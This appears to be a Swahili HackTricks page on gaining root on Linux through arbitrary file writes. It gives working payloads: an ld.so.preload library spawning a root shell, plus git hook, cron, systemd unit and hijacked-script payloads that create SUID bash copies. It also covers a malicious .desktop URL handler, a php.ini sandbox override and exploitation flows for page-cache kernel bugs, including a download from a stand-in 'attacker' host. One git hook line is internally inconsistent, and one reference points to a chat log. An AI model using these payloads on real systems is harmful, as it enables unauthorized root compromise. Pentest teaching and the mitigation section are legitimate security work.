# Uandishi wa Faili Holela kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii hufanya kazi kama environment variable ya **`LD_PRELOAD`**, lakini pia hufanya kazi katika **SUID binaries**.\
Ikiwa unaweza kuiunda au kuibadilisha, unaweza kuongeza tu **path ya library itakayopakiwa** pamoja na kila binary inayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **huendeshwa** wakati wa **events** mbalimbali katika git repository, kama vile commit inapoundwa au merge... Kwa hivyo, ikiwa **privileged script au user** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folder ya `.git`**, hii inaweza kutumiwa kwa **privesc**.

Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili iweze kutekelezwa kila mara commit mpya inapoundwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Faili za Cron na Time

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huzitekeleza**, kwa kawaida unaweza kupata code execution mara inayofuata job inapoendeshwa. Malengo ya kuvutia yanajumuisha:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab ya root katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- `systemd` timers na services zinazoanzishwa nazo

Ukaguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za kutumia vibaya:

- **Append a new root cron job** kwenye `/etc/crontab` au faili iliyo ndani ya `/etc/cron.d/`
- **Replace a script** ambayo tayari inatekelezwa na `run-parts`
- **Backdoor an existing timer target** kwa kurekebisha script au binary ambayo inaizindua

Mfano wa payload ndogo ya cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` kwa kawaida hupuuza majina ya faili yaliyo na nukta, hivyo pendelea majina kama `backup` badala ya `backup.sh`.
- Baadhi ya distros hutumia `anacron` au timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **modify kile ambacho root ata-execute baadaye**.

### Service & Socket files

Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa ku-reload na ku-restart unit, au kwa kusubiri service/socket activation path i-trigger.

Targets zinazovutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- `EnvironmentFile=` paths zinazoweza kuandikwa na zinazopakiwa na service ya root

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kuirekebisha
- **Add a drop-in override** yenye `ExecStart=` hasidi na uondoe ya zamani kwanza
- **Backdoor** script/binary ambayo tayari imerejelewa na unit
- **Hijack a socket-activated service** kwa kurekebisha faili inayolingana ya `.service` ambayo huanza socket inapopokea connection

Mfano wa override hasidi:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa uanzishaji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha upya services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuanzisha execution ya service yenye backdoor kama root.

### Overwrite `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye privileged

Baadhi ya daemons maalum huthibitisha PHP inayotolewa na mtumiaji kwa kuendesha `php` ikiwa na **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **write primitive** yoyote (kama `file_put_contents`) na unaweza kufikia **njia kamili ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika upya config hiyo** ili kuondoa vizuizi, kisha utume payload ya pili inayotekelezwa ikiwa na privileges zilizoinuliwa.

Mtiririko wa kawaida:

1. Payload ya kwanza huandika upya config ya sandbox.
2. Payload ya pili hutekeleza code baada ya dangerous functions kuwezeshwa tena.

Mfano wa chini kabisa (badilisha path inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), execution ya pili hupata root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.

### binfmt_misc

File iliyoko kwenye `/proc/sys/fs/binfmt_misc` huonyesha ni binary gani inapaswa ku-execute aina gani ya files. TODO: kagua requirements za kutumia vibaya hili ili ku-execute rev shell wakati aina ya kawaida ya file inafunguliwa.

### Overwrite schema handlers (kama http: au https:)

Attacker aliye na write permissions kwenye configuration directories za victim anaweza kwa urahisi kubadilisha au kuunda files zinazobadilisha system behavior, na kusababisha code execution isiyokusudiwa. Kwa kurekebisha file la `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file malicious (kwa mfano, kuweka `x-scheme-handler/http=evil.desktop`), attacker anahakikisha kwamba **kubofya link yoyote ya http au https hu-trigger code iliyoainishwa kwenye file hilo la `evil.desktop`**. Kwa mfano, baada ya kuweka code ifuatayo malicious kwenye `evil.desktop` ndani ya `$HOME/.local/share/applications`, kubofya URL yoyote ya nje hu-run command iliyopachikwa:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa maelezo zaidi angalia [**chapisho hili**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumika ku-exploit vulnerability halisi.

### Root akiendesha scripts/binaries zinazoweza kuandikwa na user

Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote iliyo ndani ya directory inayomilikiwa na user asiye na privileges), unaweza kuiteka:

- **Tambua utekelezaji:** fuatilia processes kwa kutumia [pspy](https://github.com/DominicBreuker/pspy) ili kunasa root iki-invoke paths zinazodhibitiwa na user:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na directory yake vinamilikiwa/ vinaweza kuandikwa na user wako.
- **Hijack target:** hifadhi nakala ya binary/script asilia na weka payload inayounda SUID shell (au root action nyingine yoyote), kisha rejesha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (kwa mfano, kubonyeza kitufe cha UI kinachoanzisha helper). Root itakapoendesha tena path iliyotekwa, pata shell yenye escalated privileges kwa `./rootshell -p`.

### Page-cache-only file modification ya privileged binaries

Baadhi ya kernel bugs hazibadilishi file **kwenye disk**. Badala yake, zinakuruhusu kubadilisha tu **page cache copy** ya file linaloweza kusomeka. Ikiwa unaweza kulenga binary ya **setuid** au binary nyingine inayoendeshwa na **root**, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na ku-escalate privileges, ingawa file hash iliyo kwenye disk haijabadilika.

Hii ni muhimu kuielewa kama **runtime-only file write primitive**:

- **Disk inabaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
- **Memory inakuwa dirty**: processes zinazosoma au ku-execute cached page hupata content iliyobadilishwa na attacker
- **Athari ni ya muda**: mabadiliko hupotea baada ya reboot au cache eviction

Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na write-position constraints
- Page-cache-only primitive inaweza kuwa reliable zaidi ikiwa vulnerable path inatoa direct writes kwenye cached file-backed pages

#### Generic privesc flow

1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au file nyingine inayoendeshwa na root
3. Trigger execution **kabla** page haijaondolewa kwenye cache
4. Pata code execution kama root huku file iliyo kwenye disk bado ikionekana kuwa haijabadilishwa

Typical high-value targets:

- **setuid-root** binaries
- Helpers zinazoanzishwa na **root services**
- Binaries zinazoendeshwa mara kwa mara kutoka kwa **containers zinazoshiriki host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file linaloweza kusomeka kwenda kwenye crypto TX scatterlist
- in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha iliandika kwenye destination tag region
- region hiyo ilipokuwa bado inareference spliced file-backed pages, write iliingia kwenye **page cache ya target file**

Kwa hiyo technique inayovutia si CVE yenyewe, bali pattern:

- **feed file-backed cache pages kwenye kernel subsystem**
- fanya subsystem **izichukulie kama writable output**
- trigger controlled overwrite ndogo kwenye memory

Public PoC ilitumia **4-byte writes** zinazorudiwa ku-patch `/usr/bin/su` kwenye memory, kisha ika-execute file hiyo.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.

Technique muhimu hapa ni hatua ya **metadata-laundering**:

- `splice()` huweka **read-only file-backed page-cache page** ndani ya ESP-in-UDP packet
- mitigation ya awali ya DirtyFrag iliweka alama `SKBFL_SHARED_FRAG` kwenye skb ili `esp_input()` ifanye **copy kabla ya decrypting**
- netfilter `TEE` inaduplika packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone inabaki na **physical page-cache reference** ileile lakini inapoteza `SKBFL_SHARED_FRAG`
- `esp_input()` kisha huichukulia clone kuwa salama na kuendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page

Kwa hiyo somo kwa reviewer ni pana zaidi ya CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua kama operation inapaswa kufanya copy kwanza, clone/copy path yoyote **inayohifadhi backing page lakini kuondoa metadata** inaweza kufungua tena write primitive bila kuonekana.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. Weka loopback juu na install **netfilter `TEE` rule** ndani ya `mangle/OUTPUT`
3. Install **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
4. Encode kila target 4-byte word kwenye SA `seq_hi` field (DirtyFrag's word-selection trick)
5. Tuma spliced ESP-in-UDP packet ili **TEE clone** ifikie `esp_input()` na ifanye decrypt **in place**
6. Rudia hadi page-cache copy ya `/usr/bin/su` au privileged executable nyingine iwe na code inayodhibitiwa na attacker

Kwa upande wa uendeshaji, impact ni ileile kama kwenye `AF_ALG` example: file iliyo kwenye disk inabaki safi, lakini `execve()` hutumia **mutated page-cache bytes** na kutoa root.

Useful exposure checks kwa variant hii:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kupunguza attack surface kwa muda mfupi pia kunategemea path hapa: kusasisha hadi kernel iliyo na `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kukiondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.

#### Mfiduo na hunting

Ikiwa unashuku aina hii ya bug, usitegemee ukaguzi wa uadilifu wa diski pekee. Pia thibitisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kutolewa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- setuid binaries ni targets nzuri kwa sababu patch inayohusisha page cache pekee inaweza kutosha kubadilisha foothold ya ndani kuwa root

#### Kupunguza attack surface kwa njia ya `algif_aead`

Ikiwa interface iliyo hatarini inatolewa na module inayoweza kupakiwa:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa imejumuishwa wakati wa kucompile kernel, baadhi ya disclosures ziliripotiwa kuzuia init path kwa:
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface maalum ya hiari, ku-disable au ku-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla ya full kernel upgrade kupatikana.

## Marejeo

- [HTB Bamboo – hijacking script inayoendeshwa na root katika directory ya PaperCut inayoweza kuandikwa na user](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: FAQ ya Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Tangazo la Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Tangazo la Copy Fail](https://copy.fail/)
- [Maelezo ya kiufundi ya Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Repository / README ya DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Kuchambua na Ku-exploit Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux mitigation ya awali: set `SKBFL_SHARED_FRAG` kwa UDP packets zilizogawanywa (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
